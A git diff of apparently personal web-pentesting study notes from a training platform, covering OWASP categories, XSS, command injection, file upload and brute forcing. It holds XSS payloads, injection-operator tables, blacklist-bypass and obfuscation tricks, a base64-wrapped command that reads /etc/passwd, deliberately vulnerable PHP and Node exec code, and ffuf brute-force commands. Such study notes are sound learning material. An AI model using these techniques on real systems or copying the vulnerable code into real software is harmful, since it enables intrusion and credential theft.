@@ -1,3 +1,41 @@
+### What Mistakes do Web Devs make
+
+| **No.** | **Mistake**                                        |
+| ------- | -------------------------------------------------- |
+| `1.`    | Permitting Invalid Data to Enter the Database      |
+| `2.`    | Focusing on the System as a Whole                  |
+| `3.`    | Establishing Personally Developed Security Methods |
+| `4.`    | Treating Security to be Your Last Step             |
+| `5.`    | Developing Plain Text Password Storage             |
+| `6.`    | Creating Weak Passwords                            |
+| `7.`    | Storing Unencrypted Data in the Database           |
+| `8.`    | Depending Excessively on the Client Side           |
+| `9.`    | Being Too Optimistic                               |
+| `10.`   | Permitting Variables via the URL Path Name         |
+| `11.`   | Trusting third-party code                          |
+| `12.`   | Hard-coding backdoor accounts                      |
+| `13.`   | Unverified SQL injections                          |
+| `14.`   | Remote file inclusions                             |
+| `15.`   | Insecure data handling                             |
+| `16.`   | Failing to encrypt data properly                   |
+| `17.`   | Not using a secure cryptographic system            |
+| `18.`   | Ignoring layer 8                                   |
+| `19.`   | Review user actions                                |
+| `20.`   | Web Application Firewall misconfigurations         |
+#### OWASP Top 10
+
+| **No.** | **Vulnerability**                          |
+| ------- | ------------------------------------------ |
+| `1.`    | Broken Access Control                      |
+| `2.`    | Cryptographic Failures                     |
+| `3.`    | Injection                                  |
+| `4.`    | Insecure Design                            |
+| `5.`    | Security Misconfiguration                  |
+| `6.`    | Vulnerable and Outdated Components         |
+| `7.`    | Identification and Authentication Failures |
+| `8.`    | Software and Data Integrity Failures       |
+| `9.`    | Security Logging and Monitoring Failures   |
+| `10.`   | Server-Side Request Forgery (SSRF)         |
 ## SQL Injection (SQLi)
 *Lots of webpages store data in SQL databases. If they don't sanitize user inputs, then it is possible to query the database from an input field *
 
@@ -263,7 +301,9 @@ For more see [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTh
 *This is when XSS code is ran directly into the browser and not stored*
 ```
 <img src="" onerror=alert(window.origin)>
+<iframe src="javascript:alert(`xss`)">.
 ```
+
 It's the same type of stuff, it just functions a little different.
 
 **Discovery**
@@ -326,7 +366,7 @@ Then run
 ```shell-session
 Enigma3nma@htb[/htb]$ mkdir /tmp/tmpserver
 Enigma3nma@htb[/htb]$ cd /tmp/tmpserver
-Enigma3nma@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+Enigma3nma@htb[/htb]$ vim index.php #at this step we wrote our index.php file
 Enigma3nma@htb[/htb]$ sudo php -S 0.0.0.0:80
 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
@@ -388,12 +428,53 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
+
+*Remember you must set up script.js, index.js, and the PHP server to get this to work*
+![[../../Pasted image 20250807102431.png]]
+
+![[../../Pasted image 20250807102352.png]]
 `
 ![[../../Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf]]
 
 
 ---
 ## Command Injection
+*Don't forget to go for reverse shells!!!!*
+Here is a tool [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+Setup
+```
+Enigma3nma@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
+Enigma3nma@htb[/htb]$ cd Bashfuscator
+Enigma3nma@htb[/htb]$ pip3 install setuptools==65
+Enigma3nma@htb[/htb]$ python3 setup.py install --user
+```
+And another tool [DOSfucation](https://github.com/danielbohannon/Invoke-DOSfuscation)
+
+| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
+| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
+| Semicolon              | `;`                     | `%3b`                     | Both                                       |
+| New Line               | `\n`                    | `%0a`                     | Both                                       |
+| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
+| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
+| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
+| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
+| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
+| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
+
+| **Injection Type**                      | **Operators**                                     |
+| --------------------------------------- | ------------------------------------------------- |
+| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
+| Command Injection                       | `;` `&&`                                          |
+| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
+| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
+| OS Command Injection                    | `;` `&` `\|`                                      |
+| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
+| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
+| Object Injection                        | `;` `&` `\|`                                      |
+| XQuery Injection                        | `'` `;` `--` `/* */`                              |
+| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
+| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
+
 Basic PHP command inject
 ```php
 <?php
@@ -401,15 +482,102 @@ if (isset($_GET['filename'])) {
     system("touch /tmp/" . $_GET['filename'] . ".pdf");
 }
 ?>
+![[../../Pasted image 20250717151422.png]]```
+```NodeJS
+app.get("/createfile", function(req, res){
+    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
+})
 ```
 
-**Blind**
-**Out-of-Band**
+![[../../Pasted image 20250717151422.png]]
+Use `asd` to end a line
+use `;` to add a second command inline
 
+*It isn't uncommon for the `new-line` operator to not actually be blacklisted*
+*If spaces `+` is blacklisted, also check tab `%09`*
+
+You may also want to try $IFS, which is the Linux Environment Variable, as its default value is a space and a tab, so as long as it is accepted and hasn't been changed it should work 
+![[../../Pasted image 20250801195709.png]]
+The other option is to add a bash brace extension, which adds spaces. it looks like this `{ls,-la}`
+
+#### How to add slashes back in
+*It is also likely to have `/` and `\` blacklisted as those are used to reference file directories in Linux and Windows*
+So how do we work around this?
+**Calling Environmental Variables**
+```linux
+echo ${PATH:0:1}
+/
+echo ${LS_COLORS:10:1}
+;
+```
+```windows
+echo %HOMEPATH:~6,-11%
+\
+```
+**Character Shifting**
+This is when you call an ASCII table and shift the characters sequentially until you get the right one
+```shell-session
+Enigma3nma@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
+Enigma3nma@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
+
+\
+```
+![[../../Pasted image 20250801204232.png]]
+
+**Bypassing Command Blacklisting**
+Single and double quotes (just don't mix quote types)
+```windows/linux
+w'h'o'am'i
+w"h"o"am"i
+```
+```linux only
+who$@ami
+w\ho\am\i
+```
+```windows only
+who^ami
+```
+![[../../Pasted image 20250801205643.png]]
+
+**Command Obfuscation**
+Case Manipulation
+```powershell-session
+ WhOaMi
+```
+```ash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+
+```
+```shell-session
+Enigma3nma@htb[/htb]$ echo 'whoami' | rev
+imaohw
+21y4d@htb[/htb]$ $(rev<<<'imaohw')
+21y4d
+```
+```Powershell
+PS C:\htb> "whoami"[-1..-20] -join ''
+imaohw
+PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
+21y4d
+```
+Command Encoding
+```
+Enigma3nma@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+Enigma3nma@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+find /usr/share/ | grep root | grep mysql | tail -n 1 
+*Isn't it beautiful?*
+![[../../Pasted image 20250807165507.png]]
+
+![[../../Command_Injections_Module_Cheat_Sheet.pdf]]
 ## Insecure File Upload
 *Sometimes there are weak restrictions on file uploads*
-
-Lets start easier with client side. 
+*Don't forget to fuzz and check directories first*
+Lets start easier with client side. *Always look here first*
 Some systems authorize file uploads via client side. The file type is sent in the packet along with the file. If this is how it authz's, then it is possible to change the actual file-type of the file while leaving the part of the packet intact that does the authz. If changing just the header doesn't work there may be scanning after there may be server side authz.
 
 ```
@@ -431,16 +599,31 @@ Now lets look at more server side techniques.
 
 At the top of a file is metadata. You can see this metadata when you cat the file into the terminal. If the server authz's the file like this, then you will need to use a file matching the type you want. Send it, and capture the request in burp. Then clear out unneeded parts of the spoofed file-type and then insert the payload directly into it in burp.
 
+Notice how we are keeping some data as well as the command structure
+![[../../Pasted image 20250807160732.png]]
+
+![[../../Pasted image 20250807160630.png]]
+
 ![[../../cheatsheet-file-inclusion.pdf]]
 
 
 ---
 
 ## AUTHN Attacks
+You can use Burp or ffuf (ffuf may be faster)
+```
+ffuf -request req.txt -request-proto http -w <password_list>
+```
+![[../../Pasted image 20250728093443.png]]
+
+Can other users AuthN with a MFA token?
+Can this be brute forced?
+
 
 ---
 
 ## External Entities Injection (XXE)
+This is another injection attack, where XML data is uploaded to a server and code is able to exit the file to run on system.
 
 ---
 ## Insecure Direct Object Reference (IDOR)
@@ -476,3 +659,17 @@ Using this we have found that the admins are
 - 1014
 and the users are 1001-1019
 ### Capstone Notes
+
+## Password Attacks
+Brute Force
+*I really hate this one*
+
+```
+ffuf -request <req.txt> -request-proto http -mode clusterbomb -w <password_wordlist>:FUZZPASS -w <user_wordlist>:FUZZUSER
+```
+![[../../Pasted image 20250731204743.png]]
+
+Hash a string
+```
+echo -n <string> | md5sum
+```
